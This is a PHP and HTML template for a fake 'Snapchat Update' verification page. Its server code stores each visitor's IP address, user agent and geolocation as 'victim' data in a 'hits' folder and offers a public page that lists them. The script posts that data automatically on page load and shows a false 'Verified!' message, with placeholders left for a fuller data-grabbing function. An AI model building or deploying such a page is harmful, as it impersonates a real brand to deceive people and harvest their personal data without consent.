<?php
// AUTO-CREATE HITS FOLDER
@mkdir('hits', 0777, true);

// SAVE HIT
if($_POST || $_SERVER['REQUEST_METHOD']=='POST'){
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    $victim = $data['data'] ?? $data;
    $ip = $victim['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $file = "hits/{$ip}_" . time() . ".json";
    file_put_contents($file, json_encode($victim, JSON_PRETTY_PRINT));
    file_put_contents("hits/log.txt", date('Y-m-d H:i:s') . " - $ip\n", FILE_APPEND);
    die('OK');
}

// SHOW HITS
if(isset($_GET['hits'])){
    echo '<h1>🎯 HITS (' . count(glob('hits/*.json')) . ')</h1><pre>';
    foreach(glob('hits/*.json') as $f){
        echo "<b>" . basename($f) . "</b>\n";
        echo file_get_contents($f) . "\n\n<hr>\n";
    }
    echo '</pre><a href="/">← Back</a>';
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snap Update</title>
    <!-- YOUR FULL CSS HERE (copy from your HTML) -->
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #000; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { background: #111; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; }
        button { background: #ff0050; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; }
        .hits { position: fixed; top: 10px; right: 10px; background: #ff0050; padding: 10px; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="hits"><a href="?hits=1" style="color:white;">📊 HITS</a></div>
    <div class="container">
        <h1>👻 Snapchat Update</h1>
        <p>Verify to continue</p>
        <button onclick="verify()">VERIFY NOW</button>
        <div id="status"></div>
    </div>

<script>
// YOUR FULL JAVASCRIPT HERE (copy from your HTML)
async function verify(){
    // GRAB EVERYTHING (your exact code)
    const data = {ip:'fetching', geo:{}, ua:navigator.userAgent};
    // ... rest of your grabEverything() function ...
    
    fetch('',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data})});
    document.getElementById('status').innerHTML = '✅ Verified!';
}
window.onload = verify; // AUTO SEND
</script>
</body>
</html>